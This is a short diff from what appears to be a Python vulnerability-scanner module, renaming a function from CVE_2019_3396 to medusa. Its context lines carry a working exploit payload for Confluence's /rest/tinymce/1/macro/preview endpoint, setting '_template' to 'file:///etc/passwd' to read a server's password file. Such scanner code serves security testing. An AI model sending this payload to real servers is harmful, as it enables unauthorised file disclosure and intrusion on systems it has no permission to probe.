@@ -14,7 +14,7 @@ def UrlProcessing(url):
 
 PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
 Payload="/rest/tinymce/1/macro/preview"
-def CVE_2019_3396(Url,RandomAgent,ProxyIp):
+def medusa(Url,RandomAgent,ProxyIp):
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
